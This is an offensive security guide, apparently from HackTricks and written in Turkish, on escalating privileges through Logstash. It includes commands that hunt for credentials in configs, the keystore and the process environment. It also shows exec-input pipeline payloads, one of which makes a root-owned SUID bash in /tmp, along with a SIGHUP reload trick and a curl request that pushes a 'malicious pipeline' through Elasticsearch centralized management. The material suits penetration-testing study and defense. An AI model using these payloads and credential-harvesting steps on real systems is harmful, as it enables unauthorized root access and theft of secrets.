# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash, **pipeline** olarak bilinen bir sistem aracılığıyla günlükleri **toplamak, dönüştürmek ve dağıtmak** için kullanılır. Bu pipeline’lar **girdi**, **filtre** ve **çıktı** aşamalarından oluşur.<sup>[[4]](#references)</sup> Logstash’in ele geçirilmiş bir makinede çalışması ilgi çekici bir durum ortaya çıkarır.

### Pipeline Yapılandırması

Debian ve RPM paket kurulumlarında pipeline’lar, pipeline yapılandırmalarının konumlarını listeleyen **/etc/logstash/pipelines.yml** aracılığıyla yapılandırılır; diğer dağıtımlarda `pipelines.yml`, Logstash’in `path.settings` dizinine yerleştirilir.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Bu dosya, pipeline yapılandırmalarını içeren **.conf** dosyalarının nerede bulunduğunu gösterir. **Elasticsearch output** kullanırken `user`/`password`, `cloud_auth` veya `api_key` ayarlarını inceleyin; hesabın etkin ayrıcalıkları Elasticsearch'e bağlıdır. `path.config` glob'u, ilgili pipeline için eşleşen tüm dosyaları yükler.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstash, `pipelines.yml` yerine `-f <directory>` ile başlatılırsa `-f` önceliklidir ve **bu dizindeki tüm dosyalar sözlükbilimsel sırayla birleştirilip tek bir config olarak ayrıştırılır**.<sup>[[6]](#references)[[7]](#references)</sup> Bu durum saldırı açısından iki sonuç doğurur:

- `000-input.conf` veya `zzz-output.conf` gibi bırakılan bir dosya, nihai pipeline'ın nasıl birleştirileceğini değiştirebilir
- Hatalı biçimlendirilmiş bir dosya, birleştirilmiş config'in doğrulamadan geçememesine neden olabilir; yeniden yükleme sırasında Logstash önceki pipeline'ı korur, bu nedenle otomatik yeniden yüklemeye güvenmeden önce payload'ları doğrulayın.<sup>[[1]](#references)</sup>

### Ele Geçirilmiş Bir Host'ta Hızlı Keşif

Logstash'in kurulu olduğu bir makinede şunları hızla inceleyin:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Yerel monitoring API'sine erişilip erişilemediğini de kontrol edin. Varsayılan olarak **127.0.0.1:9600** adresine bağlanır; bu, genellikle host'a erişim sağladıktan sonra yeterlidir.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Bu endpoint'ler pipeline ID'lerini ve ayarlarını, çalışma zamanı metriklerini ve yapılandırma yeniden yükleme başarı/başarısızlık sayaçlarını açığa çıkararak bir değişikliğin kabul edilip edilmediğini doğrulamaya yardımcı olur.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Kurtarılan bir kimlik bilgisi **Elasticsearch**'i hedefliyorsa [Elasticsearch hakkındaki bu diğer sayfayı](../../network-services-pentesting/9200-pentesting-elasticsearch.md) kontrol edin.

### Dinamik bir komut çıktısına veri sağlayan file input

Bir pipeline yapılandırması mevcut kullanıcı için salt okunur olabilirken, [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) kullanıcının yazma izni olan bir yolu izliyor olabilir. Yüklenen pipeline'ı bu input'tan başlayarak herhangi bir [Grok field capture](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) üzerinden bir [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec) noktasına kadar takip edin. Exec output, `command` değerini bir shell üzerinden iletir ve `%{field}` değerlerini shell metakarakterlerini temizlemeden yerine koyar. Yazılabilir bir input yolu, yalnızca çalışan servis daha yüksek ayrıcalıklı bir kimlikle çalışıyorsa, kullanıcının dosyası gerçekten izlenen input'a girebiliyorsa, filtreler ve output koşulları içeriği komut alanına yönlendiriyorsa ve ilgili output plugin yüklü ve etkinse ayrıcalık yükseltme açısından ipucu oluşturur. Dizinlerde arama/yazma izinlerini, file input izleme durumunu ve etkin servis hesabını ayrı ayrı kontrol edin; pasif keşif sırasında test olayı yazmayın veya output'u çağırmayın.

### Yazılabilir Pipeline'lar Üzerinden Ayrıcalık Yükseltme

Ayrıcalık yükseltmeyi denemek için önce Logstash servisinin gerçekte hangi kullanıcıyla çalıştığını belirleyin; root veya **logstash** kullanıcısı olduğunu varsaymayın. Aşağıdaki ölçütlerden **birini** karşıladığınızdan emin olun:

- Bir pipeline **.conf** dosyasına **yazma erişimine** sahip olun **veya**
- **/etc/logstash/pipelines.yml** dosyası wildcard kullanıyor olsun ve hedef klasöre yazabiliyor olun.<sup>[[6]](#references)[[7]](#references)</sup>

Ek olarak, aşağıdaki koşullardan **biri** yerine getirilmelidir:

- Logstash servisini yeniden başlatabilme yeteneği **veya**
- **/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarlanmış olsun.<sup>[[1]](#references)[[15]](#references)</sup>

Yapılandırmada wildcard varsa bu wildcard ile eşleşen bir dosya oluşturmak komut çalıştırılmasını sağlar.<sup>[[7]](#references)[[9]](#references)</sup> Örneğin:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Burada **interval**, saniye cinsinden çalıştırma sıklığını belirler. Verilen örnekte **whoami** komutu her 120 saniyede bir çalışır ve çıktısı **/tmp/output.log** dosyasına yönlendirilir.<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarı etkinse Logstash, yeniden başlatma gerektirmeden yeni veya değiştirilmiş pipeline yapılandırmalarını otomatik olarak algılar ve uygular.<sup>[[1]](#references)[[15]](#references)</sup> Wildcard yoksa mevcut yapılandırmalar yine değiştirilebilir; ancak kesintileri önlemek için dikkatli olunmalıdır.

### Daha Güvenilir Pipeline Payload'ları

`exec` input plugin güncel sürümlerde çalışmaya devam eder ve `interval` ya da `schedule` gerektirir. Logstash JVM'sini **fork** ederek çalıştırır; bu nedenle bellek yetersizse payload sessizce çalışmak yerine `ENOMEM` hatasıyla başarısız olabilir.<sup>[[9]](#references)</sup>

Servis, root sahipliğinde bir SUID dosyası oluşturacak yeterli ayrıcalığa sahipse, kalıcı bir artefakt bırakan payload pratik bir privilege-escalation yöntemidir:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Yeniden başlatma yetkiniz yoksa ancak sürece sinyal gönderebiliyorsanız, Logstash Unix benzeri sistemlerde **SIGHUP** tetiklemeli yeniden yüklemeyi de destekler:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Her plugin yeniden yüklemeyle uyumlu değildir. Örneğin, **stdin** input otomatik yeniden yüklemeyi engeller; bu nedenle `config.reload.automatic` ayarının değişikliklerinizi her zaman algılayacağını varsaymayın.<sup>[[1]](#references)</sup>

### Logstash'ten Secret'ları Çalma

Yalnızca code execution'a odaklanmadan önce, Logstash'in zaten erişebildiği verileri toplayın:

- Kimlik bilgileri `elasticsearch {}` output'larında, `http_poller` URL'lerinde/ayarlarında, JDBC input'larında veya bulutla ilgili ayarlarda bulunabilir; bu plugin'lerde aramaya değer kimlik bilgisi alanları vardır.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings, **`/etc/logstash/logstash.keystore`** dosyasında veya başka bir `path.settings` dizininde bulunabilir.<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore parolası **`LOGSTASH_KEYSTORE_PASS`** üzerinden sağlanabilir ve RPM/DEB kurulumları servis ortam değişkenlerini **`/etc/sysconfig/logstash`** dosyasından yükler.<sup>[[10]](#references)</sup>
- `${VAR}` ile ortam değişkeni genişletme, Logstash başlatıldığında çözülür; bu nedenle servis ortamını incelemeye değer.<sup>[[14]](#references)</sup>

Yararlı kontroller:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Bu ayrıca kontrol edilmeye değer; çünkü **CVE-2023-46672**, belirli koşullar altında Logstash'in keystore'da saklanan ve yapılandırmada referans verilen secret'lar da dahil olmak üzere hassas bilgileri loglarına kaydettiğini gösterdi. Bu koşullar geçerli olabilecekse eski Logstash loglarını ve `journald` girdilerini inceleyin.<sup>[[3]](#references)</sup>

### Merkezi Pipeline Yönetiminin Kötüye Kullanılması

Bazı ortamlarda host, yerel `.conf` dosyalarına hiç bağlı olmayabilir. **`xpack.management.enabled: true`** yapılandırılmışsa Logstash, Elasticsearch/Kibana'dan merkezi olarak yönetilen pipeline'ları çekebilir ve bu mod etkinleştirildikten sonra yerel pipeline yapılandırmaları artık gerçek kaynak olmaz.<sup>[[2]](#references)</sup>

Bu, farklı bir saldırı yolu anlamına gelir:

1. Yerel Logstash ayarlarından, keystore'dan veya loglardan Elastic kimlik bilgilerini elde edin.<sup>[[3]](#references)[[10]](#references)</sup>
2. Hesabın **`manage_logstash_pipelines`** cluster ayrıcalığına sahip olup olmadığını doğrulayın.<sup>[[16]](#references)</sup>
3. Logstash host'unun bir sonraki yoklama aralığında payload'unuzu çalıştırması için merkezi olarak yönetilen bir pipeline oluşturun veya mevcut olanı değiştirin.<sup>[[2]](#references)[[16]](#references)</sup>

Bu özellik için kullanılan Elasticsearch API'si şöyledir:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Bu, özellikle yerel dosyalar salt okunur olduğunda ancak Logstash zaten pipeline'ları uzaktan alacak şekilde kaydedilmiş olduğunda kullanışlıdır.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Yapılandırma Dosyasını Yeniden Yükleme](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Merkezi Pipeline Yönetimini Yapılandırma](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Güvenlik Güncellemesi (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Logstash Pipeline Oluşturma](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash Dizin Düzeni](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Birden Çok Pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Logstash'ı Komut Satırından Çalıştırma](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: API'lerle Logstash'ı İzleme](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Güvenli ayarlar için secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Ortam değişkenlerini kullanma](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash pipeline oluşturma veya güncelleme](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pipeline'lar için ayarları alma](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pipeline'lar için istatistikleri alma](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
